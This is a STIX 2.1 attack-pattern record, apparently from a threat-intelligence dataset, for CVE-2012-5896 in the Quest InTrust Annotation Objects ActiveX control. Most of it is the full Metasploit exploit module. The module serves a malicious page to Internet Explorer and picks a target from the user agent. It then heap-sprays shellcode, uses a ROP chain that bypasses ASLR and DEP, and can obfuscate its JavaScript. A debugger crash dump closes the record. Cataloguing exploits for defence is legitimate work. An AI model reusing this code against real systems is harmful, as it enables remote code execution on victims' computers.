{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--88571177-dba8-4c83-8701-e650bbc880e7",
    "created": "2024-08-14T16:44:21.103004Z",
    "modified": "2024-08-14T16:44:21.103009Z",
    "name": "Quest InTrust Annotation Objects Uninitialized Pointer",
    "description": " This module exploits an uninitialized variable vulnerability in the Annotation Objects ActiveX component. The ActiveX component loads into memory without opting into ALSR so this module exploits the vulnerability against windows Vista and Windows 7 targets. A large heap spray is required to fulfill the requirement that EAX points to part of the ROP chain in a heap chunk and the calculated call will hit the pivot in a separate heap chunk. This will take some time in the users browser.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/intrust_annotatex_add.rb",
            "external_id": "intrust_annotatex_add.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-5896"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super( update_info(info,\n      'Name'           => 'Quest InTrust Annotation Objects Uninitialized Pointer',\n      'Description'    => %q{\n          This module exploits an uninitialized variable vulnerability in the\n        Annotation Objects ActiveX component. The ActiveX component loads into memory without\n        opting into ALSR so this module exploits the vulnerability against windows Vista and\n        Windows 7 targets. A large heap spray is required to fulfill the requirement that EAX\n        points to part of the ROP chain in a heap chunk and the calculated call will hit the\n        pivot in a separate heap chunk. This will take some time in the users browser.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>',             # initial discovery & poc\n          'mr_me <steventhomasseeley[at]gmail.com>'   # msf module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-5896'],\n          [ 'OSVDB', '80662'],\n          [ 'BID', '52765'],\n          [ 'EDB', '18674']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # call dword ptr ANNOTA_1!DllUnregisterServer+0x19235 (44024a50)[eax*4]\n          # calculation: <targetaddress> - 0x44024a50 / 4 = Ret\n          [ 'Automatic', {} ],\n\n          # Windows XP/Vista/IE6/IE7 target\n          [\n            'Windows XP/Vista SP0-SP3 (IE6/IE7)',\n            {\n              'Ret' => 0x76767676,\n            }\n          ],\n\n          # Windows XP/IE8 target - ASLR/DEP Bypass\n          [\n            'Windows XP SP0-SP3 DEP bypass (IE8)',\n            {\n              'Ret' => 0x31AAAD78,\n            }\n          ],\n\n          # Windows 7/Vista/IE8 target - ASLR/DEP Bypass\n          [\n            'Windows 7/Vista ALSR/DEP bypass (IE8)',\n            {\n              'Ret' => 0x31AAAD78,\n            }\n          ]\n        ],\n      'DisclosureDate' => '2012-03-28',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript Obfuscation', true])\n      ])\n  end\n\n  def junk\n    return rand_text_alpha(4).unpack(\"L\")[0].to_i\n  end\n\n  def nops(s)\n    nops = make_nops(4).unpack(\"N*\") * s\n    return nops\n  end\n\n  def on_request_uri(cli, request)\n    #Set target manually or automatically\n    my_target = target\n    if my_target.name == 'Automatic'\n      agent = request.headers['User-Agent']\n      if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6\\.0/\t# xp/ie6\n        my_target = targets[1]\n      elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7\\.0/\t# xp/ie7\n        my_target = targets[1]\n      elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7\\.0/\t# vista/ie7\n        my_target = targets[1]\n      elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8\\.0/\t# xp/ie8\n        my_target = targets[2]\n      elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 8\\.0/\t# vista/ie8\n        my_target = targets[2]\n      elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 8\\.0/\t# win7/ie8\n        my_target = targets[3]\n      end\n    end\n\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # shellcode\n    sc = Rex::Text.to_unescape(p.encoded)\n\n    # Randomize object name\n    obj_name  = rand_text_alpha(rand(100) + 1)\n    main_sym  = 'main' #main function name\n\n    randnop = rand_text_alpha(rand(100) + 1)\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4)\n\n    if my_target.name =~ /IE6/ or my_target.name =~ /IE7/\n\n      js = <<-EOS\n      function heapspray(){\n        shellcode = unescape('#{sc}');\n        #{randnop} = \"#{js_nops};\n        bigblock = unescape(#{randnop});\n        headersize = 20;\n        slackspace = headersize+shellcode.length;\n        while (bigblock.length<slackspace){ bigblock+=bigblock; }\n        fillblock = bigblock.substring(0, slackspace);\n        block = bigblock.substring(0, bigblock.length-slackspace);\n        while(block.length+slackspace<0x40000){ block = block+block+fillblock; }\n        memory = new Array();\n        for (i=0;i<1000;i++){ memory[i] = block+shellcode; }\n      }\n\n      function main(){\n        heapspray();\n  \t\t\t\t#{obj_name}.Add(#{my_target.ret},1);\n      }\n      EOS\n\n    end\n\n    if my_target.name =~ /IE8/\n\n      # all rop gadgets are taken from AnnotateX.dll - v1.0.32.0 (non alsr/non rebase)\n      rop_gadgets = [\n        junk,\n        junk,\n        junk,\n        0x44014075  # xchg eax,esp ; add [ecx],10 ; retn 8 (pivot)\n      ].pack('V*')\n\n      rop_gadgets << [0x44015CEF].pack('V*') * 140\t# padding of retn's\n\n      rop_gadgets << [\n        0x44015CEF,  # retn\n        0x44015CEF,  # retn\n        0x44015CEF,  # retn\n        0x44015cee,  # pop edx ; retn\n        0x4401a130,  # ptr to &VirtualAlloc() (IAT)\n        0x44015ca4,  # mov eax,[edx+4] ; retn\n        0x44001218,  # push eax ; dec eax ; pop esi ; pop ebp ; retn 14\n        junk,        # filler (compensate)\n        0x440159bb,  # pop ebp ; retn\n        junk,        # filler (retn offset compensation)\n        junk,        # filler (retn offset compensation)\n        junk,        # filler (retn offset compensation)\n        junk,        # filler (retn offset compensation)\n        0x4400238A,  # filler (pop edi ; pop esi ; pop ebp ; retn)\n        0x440012c1,  # push esp ; ret 08\n        0x44016264,  # pop ebx ; retn\n        0x00004000,  # 0x00000001-> ebx\n        0x44015cc9,  # pop edx ; retn\n        0x00001000,  # 0x00001000-> edx\n        0x44017664,  # pop ecx ; retn\n        0x00000040,  # 0x00000040-> ecx\n        0x44017bd8,  # pop edi ; retn\n        0x44017ebe,  # retn\n        0x4400bf25,  # pop eax ; retn\n        0x0C0C2478,  # pointer+0x0c to pop edi ; pop esi ; pop ebp ; retn\n        0x44005C57,  # pushad ; push 8 ; push ecx; push esi; call [eax+c]\n        0x90909090,  # nops, do not change as it changes the offset\n        nops(11)\n      ].flatten.pack('V*')\n\n      rop = Rex::Text.to_unescape(rop_gadgets)\n\n      js = <<-EOF\n      function heapspray(){\n        var payload = unescape('#{rop}');\n        payload += unescape('#{sc}');\n        var data = payload;\n        while(data.length < 100000) { data += data; }\n        var onemeg = data.substr(0, 64*1024/2);\n\n        for (i=0; i<14; i++) {\n          onemeg += data.substr(0, 64*1024/2);\n        }\n\n        onemeg += data.substr(0, (64*1024/2)-(38/2));\n        var block = new Array();\n\n        for (i=0; i<700; i++) {\n          block[i] = onemeg.substr(0, onemeg.length);\n    \t\t\t}\n      }\n\n      function main(){\n        heapspray();\n        #{obj_name}.Add(#{my_target.ret},1);\n      }\n      EOF\n\n      #JS obfuscation on demand only for IE8\n      if datastore['OBFUSCATE']\n        js = ::Rex::Exploitation::JSObfu.new(js)\n        js.obfuscate(memory_sensitive: true)\n        main_sym = js.sym('main')\n      end\n\n    end\n\n    content = <<-EOF\n    <object classid='clsid:EF600D71-358F-11D1-8FD4-00AA00BD091C' id='#{obj_name}' ></object>\n    <script language='JavaScript' defer>\n    #{js}\n    </script>\n    <body onload=\"#{main_sym}();\">\n    <body>\n    </html>\n    EOF\n\n    print_status(\"Sending #{self.name}\")\n\n    #Remove the extra tabs from content\n    content = content.gsub(/^ {4}/, '')\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n=begin\neax=76767676 ebx=4401e51c ecx=01f85340 edx=00000000 esi=01f85340 edi=00000001\neip=4400ae62 esp=015fd134 ebp=015fd140 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\nANNOTA_1+0xae62:\n4400ae62 ff1485504a0244  call    dword ptr ANNOTA_1!DllUnregisterServer+0x19235 (44024a50)[eax*4] ds:0023:1ddc2428=????????\n=end\n",
    "x_mitre_disclosure_date": "2012-03-28",
    "x_mitre_platforms": [
        "win'"
    ]
}